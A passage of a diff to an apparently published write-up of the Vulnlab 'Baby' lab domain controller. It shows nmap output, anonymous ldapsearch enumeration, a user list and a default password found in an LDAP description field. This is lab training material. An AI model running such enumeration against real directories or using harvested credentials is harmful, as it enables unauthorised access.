-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="go">| MjAxMTIxNTJaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG</span>
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="go">| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuquv0xygIC6VYkeMb0xvhqlKSP4NuWZgS1rw</span>
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="go">| vohVW8/SdsUY2CLaXpR7csnkVI3nNvxYOv35qm/LfrUrMvbbT5YCPo5jqy6tp9Df</span>
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="go">| 5+EwK3vnY3fdY3GaXEDifkp1J132+ZGM+SQx1paCj5uTsXYrlCLSO6EFvqCB+mfU</span>
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="go">| vRD8FPmbY+FA2Cd7gSK2J6gF854PiOwMIUT9HRy+0J2xVzAKTAMxgF5w+9YMucvN</span>
-</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="go">| SLFmWVqQZcRFk0yVWwtbVxv/OT4Lsz3uyWmZFV+5d+8zd1S+W+BqeremGsW47xWP</span>
-</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="go">| kZQRBaXMtyggG4ymVT2jZDkGroSBi10OeGsGTrsrY6xEstAQ3QIDAQABoyQwIjAT</span>
-</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="go">| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD</span>
-</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="go">| ggEBAD4PWAN6BB8rb1EBve9LNkXUWHSb0m4u2LYjGVfSXI4aeXULELMTpX8Kf1Oy</span>
-</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="go">| 5+Voaij0stmH+pcYfhzcnZz6cSYbhk2JRphfyRVmtppHAK5jKrk5ut4lr4XiWItp</span>
-</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="go">| qOqZcKzcWfThp92LRwx+2dx8YEXBzLQVnAAcbXe7VbM3qJHHu/RChQHYb9+u0Czr</span>
-</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="go">| 8ut/5n9XPPOLO3FLVmJ7EHjWwFTAS+a6wPPqFdzKtR2DJ3T7DhwXVmqG5AGY+JFS</span>
-</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="go">| ShFRSOmEc1joekHyNYuwfPNQk/TCdKyFt76N6tMcq70CRpDNaSOCp3r5cvSY2BH+</span>
-</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="go">| 2X2UcOYxSOiC0YEv8SxBCirWoJA=</span>
-</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="go">|_-----END CERTIFICATE-----</span>
-</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="go">| rdp-ntlm-info: </span>
-</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="go">|   Target_Name: BABY</span>
-</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="go">|   NetBIOS_Domain_Name: BABY</span>
-</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="go">|   NetBIOS_Computer_Name: BABYDC</span>
-</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="go">|   DNS_Domain_Name: baby.vl</span>
-</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="go">|   DNS_Computer_Name: BabyDC.baby.vl</span>
-</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="go">|   Product_Version: 10.0.20348</span>
-</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="go">|_  System_Time: 2024-06-21T11:53:09+00:00</span>
-</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="go">|_ssl-date: 2024-06-21T11:53:49+00:00; 0s from scanner time.</span>
-</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="go">5357/tcp  open  tcpwrapped    syn-ack ttl 127</span>
-</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="go">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
-</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
-</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="go">|_http-title: Not Found</span>
-</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="go">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span>
-</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="go">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a><span class="go">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a><span class="go">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a><span class="go">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
-</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a><span class="go">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a><span class="go">56612/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a><span class="go">64285/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span></code></pre></div>
-<h3 id="service-footprinting">Service footprinting</h3>
-<h4 id="ldap-enumeration">LDAP Enumeration</h4>
+<p><a class="glightbox" href="../../../images/vulnlab_baby/baby.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/vulnlab_baby/baby.png" /></a></p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="go">PORT      STATE SERVICE       REASON          VERSION</span>
+<span class="go">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span>
+<span class="go">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-21 11:52:19Z)</span>
+<span class="go">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">445/tcp   open  microsoft-ds? syn-ack ttl 127</span>
+<span class="go">464/tcp   open  kpasswd5?     syn-ack ttl 127</span>
+<span class="go">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span>
+<span class="go">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span>
+<span class="go">| Issuer: commonName=BabyDC.baby.vl</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-06-20T11:21:52</span>
+<span class="go">| Not valid after:  2024-12-20T11:21:52</span>
+<span class="go">| MD5:   1553:8e6f:d6f7:6a63:9c3e:fb81:d241:adb2</span>
+<span class="go">| SHA-1: bc71:79c1:6c0c:ae2b:00f6:ec7f:7b4e:8dbf:31a0:c22e</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIC4DCCAcigAwIBAgIQFcXuQwk5Mr5Iro4L87Y/gjANBgkqhkiG9w0BAQsFADAZ</span>
+<span class="go">| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA2MjAxMTIxNTJaFw0yNDEy</span>
+<span class="go">| MjAxMTIxNTJaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG</span>
+<span class="go">| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuquv0xygIC6VYkeMb0xvhqlKSP4NuWZgS1rw</span>
+<span class="go">| vohVW8/SdsUY2CLaXpR7csnkVI3nNvxYOv35qm/LfrUrMvbbT5YCPo5jqy6tp9Df</span>
+<span class="go">| 5+EwK3vnY3fdY3GaXEDifkp1J132+ZGM+SQx1paCj5uTsXYrlCLSO6EFvqCB+mfU</span>
+<span class="go">| vRD8FPmbY+FA2Cd7gSK2J6gF854PiOwMIUT9HRy+0J2xVzAKTAMxgF5w+9YMucvN</span>
+<span class="go">| SLFmWVqQZcRFk0yVWwtbVxv/OT4Lsz3uyWmZFV+5d+8zd1S+W+BqeremGsW47xWP</span>
+<span class="go">| kZQRBaXMtyggG4ymVT2jZDkGroSBi10OeGsGTrsrY6xEstAQ3QIDAQABoyQwIjAT</span>
+<span class="go">| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD</span>
+<span class="go">| ggEBAD4PWAN6BB8rb1EBve9LNkXUWHSb0m4u2LYjGVfSXI4aeXULELMTpX8Kf1Oy</span>
+<span class="go">| 5+Voaij0stmH+pcYfhzcnZz6cSYbhk2JRphfyRVmtppHAK5jKrk5ut4lr4XiWItp</span>
+<span class="go">| qOqZcKzcWfThp92LRwx+2dx8YEXBzLQVnAAcbXe7VbM3qJHHu/RChQHYb9+u0Czr</span>
+<span class="go">| 8ut/5n9XPPOLO3FLVmJ7EHjWwFTAS+a6wPPqFdzKtR2DJ3T7DhwXVmqG5AGY+JFS</span>
+<span class="go">| ShFRSOmEc1joekHyNYuwfPNQk/TCdKyFt76N6tMcq70CRpDNaSOCp3r5cvSY2BH+</span>
+<span class="go">| 2X2UcOYxSOiC0YEv8SxBCirWoJA=</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">| rdp-ntlm-info: </span>
+<span class="go">|   Target_Name: BABY</span>
+<span class="go">|   NetBIOS_Domain_Name: BABY</span>
+<span class="go">|   NetBIOS_Computer_Name: BABYDC</span>
+<span class="go">|   DNS_Domain_Name: baby.vl</span>
+<span class="go">|   DNS_Computer_Name: BabyDC.baby.vl</span>
+<span class="go">|   Product_Version: 10.0.20348</span>
+<span class="go">|_  System_Time: 2024-06-21T11:53:09+00:00</span>
+<span class="go">|_ssl-date: 2024-06-21T11:53:49+00:00; 0s from scanner time.</span>
+<span class="go">5357/tcp  open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span>
+<span class="go">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">56612/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">64285/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+</code></pre></div>
+<h3 id="service-footprinting">Service footprinting<a class="headerlink" href="#service-footprinting" title="Permanent link">&para;</a></h3>
+<h4 id="ldap-enumeration">LDAP Enumeration<a class="headerlink" href="#ldap-enumeration" title="Permanent link">&para;</a></h4>
 <p>Initial checks didn't return anything for me, but once I added the base naming context, I got some results. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot;                     </span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="gp"># </span>extended<span class="w"> </span>LDIF<span class="w">  </span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="gp">#  </span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="gp"># </span>LDAPv3<span class="w">  </span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="gp"># </span>base<span class="w"> </span>&lt;<span class="nv">DC</span><span class="o">=</span>baby,DC<span class="o">=</span>vl&gt;<span class="w"> </span>with<span class="w"> </span>scope<span class="w"> </span>subtree<span class="w">  </span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="gp"># </span>filter:<span class="w"> </span><span class="o">(</span><span class="nv">objectclass</span><span class="o">=</span>*<span class="o">)</span><span class="w">  </span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="gp"># </span>requesting:<span class="w"> </span>ALL<span class="w">  </span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="gp">#  </span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="gp"># </span>baby.vl<span class="w">  </span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="go">dn: DC=baby,DC=vl  </span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="gp"># </span>Administrator,<span class="w"> </span>Users,<span class="w"> </span>baby.vl<span class="w">  </span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="go">[...SNIP...]</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="gp"># </span>Teresa<span class="w"> </span>Bell,<span class="w"> </span>it,<span class="w"> </span>baby.vl<span class="w">  </span>
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="go">objectClass: top  </span>
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="go">objectClass: person  </span>
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="go">objectClass: organizationalPerson  </span>
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="go">objectClass: user  </span>
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="go">cn: Teresa Bell  </span>
-</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="go">sn: Bell  </span>
-</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="go">description: Set initial password to BabyStart123!  </span>
-</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="go">givenName: Teresa  </span>
-</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="go">distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="go">instanceType: 4  </span>
-</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="go">whenCreated: 20211121151108.0Z  </span>
-</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="go">whenChanged: 20211121151437.0Z  </span>
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="go">displayName: Teresa Bell  </span>
-</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="go">uSNCreated: 12889  </span>
-</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="go">memberOf: CN=it,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="go">uSNChanged: 12905  </span>
-</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="go">name: Teresa Bell  </span>
-</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="go">objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==  </span>
-</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="go">userAccountControl: 66080  </span>
-</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="go">badPwdCount: 0  </span>
-</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="go">codePage: 0  </span>
-</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="go">countryCode: 0  </span>
-</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="go">badPasswordTime: 0  </span>
-</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="go">lastLogoff: 0  </span>
-</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="go">lastLogon: 0  </span>
-</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="go">pwdLastSet: 132819812778759642  </span>
-</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="go">primaryGroupID: 513  </span>
-</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="go">objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==  </span>
-</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="go">accountExpires: 9223372036854775807  </span>
-</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="go">logonCount: 0  </span>
-</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="go">sAMAccountName: Teresa.Bell  </span>
-</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="go">sAMAccountType: 805306368  </span>
-</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="go">userPrincipalName: Teresa.Bell@baby.vl  </span>
-</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="go">objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl  </span>
-</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="go">dSCorePropagationData: 20211121163014.0Z  </span>
-</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="go">dSCorePropagationData: 20211121162927.0Z  </span>
-</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="go">dSCorePropagationData: 16010101000416.0Z  </span>
-</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a><span class="go">msDS-SupportedEncryptionTypes: 0  </span>
-</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>
-</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="go">[...SNIP...]</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot;                     </span>
+<span class="gp"># </span>extended<span class="w"> </span>LDIF<span class="w">  </span>
+<span class="gp">#  </span>
+<span class="gp"># </span>LDAPv3<span class="w">  </span>
+<span class="gp"># </span>base<span class="w"> </span>&lt;<span class="nv">DC</span><span class="o">=</span>baby,DC<span class="o">=</span>vl&gt;<span class="w"> </span>with<span class="w"> </span>scope<span class="w"> </span>subtree<span class="w">  </span>
+<span class="gp"># </span>filter:<span class="w"> </span><span class="o">(</span><span class="nv">objectclass</span><span class="o">=</span>*<span class="o">)</span><span class="w">  </span>
+<span class="gp"># </span>requesting:<span class="w"> </span>ALL<span class="w">  </span>
+<span class="gp">#  </span>
+
+<span class="gp"># </span>baby.vl<span class="w">  </span>
+<span class="go">dn: DC=baby,DC=vl  </span>
+
+<span class="gp"># </span>Administrator,<span class="w"> </span>Users,<span class="w"> </span>baby.vl<span class="w">  </span>
+<span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
+
+<span class="go">[...SNIP...]</span>
+
+<span class="gp"># </span>Teresa<span class="w"> </span>Bell,<span class="w"> </span>it,<span class="w"> </span>baby.vl<span class="w">  </span>
+<span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
+<span class="go">objectClass: top  </span>
+<span class="go">objectClass: person  </span>
+<span class="go">objectClass: organizationalPerson  </span>
+<span class="go">objectClass: user  </span>
+<span class="go">cn: Teresa Bell  </span>
+<span class="go">sn: Bell  </span>
+<span class="go">description: Set initial password to BabyStart123!  </span>
+<span class="go">givenName: Teresa  </span>
+<span class="go">distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
+<span class="go">instanceType: 4  </span>
+<span class="go">whenCreated: 20211121151108.0Z  </span>
+<span class="go">whenChanged: 20211121151437.0Z  </span>
+<span class="go">displayName: Teresa Bell  </span>
+<span class="go">uSNCreated: 12889  </span>
+<span class="go">memberOf: CN=it,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">uSNChanged: 12905  </span>
+<span class="go">name: Teresa Bell  </span>
+<span class="go">objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==  </span>
+<span class="go">userAccountControl: 66080  </span>
+<span class="go">badPwdCount: 0  </span>
+<span class="go">codePage: 0  </span>
+<span class="go">countryCode: 0  </span>
+<span class="go">badPasswordTime: 0  </span>
+<span class="go">lastLogoff: 0  </span>
+<span class="go">lastLogon: 0  </span>
+<span class="go">pwdLastSet: 132819812778759642  </span>
+<span class="go">primaryGroupID: 513  </span>
+<span class="go">objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==  </span>
+<span class="go">accountExpires: 9223372036854775807  </span>
+<span class="go">logonCount: 0  </span>
+<span class="go">sAMAccountName: Teresa.Bell  </span>
+<span class="go">sAMAccountType: 805306368  </span>
+<span class="go">userPrincipalName: Teresa.Bell@baby.vl  </span>
+<span class="go">objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl  </span>
+<span class="go">dSCorePropagationData: 20211121163014.0Z  </span>
+<span class="go">dSCorePropagationData: 20211121162927.0Z  </span>
+<span class="go">dSCorePropagationData: 16010101000416.0Z  </span>
+<span class="go">msDS-SupportedEncryptionTypes: 0  </span>
+
+<span class="go">[...SNIP...]</span>
+</code></pre></div>
 <p>Note the description field for the <code>Teresa.Bell</code> user.</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">description: Set initial password to BabyStart123!</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">description: Set initial password to BabyStart123!</span>
+</code></pre></div>
 <p>We can get a full list of users with the following command:</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot; &quot;users&quot; | grep dn  </span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="go">dn: DC=baby,DC=vl  </span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="go">dn: CN=Guest,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="go">dn: CN=krbtgt,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="go">dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="go">dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="go">dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="go">dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  </span>
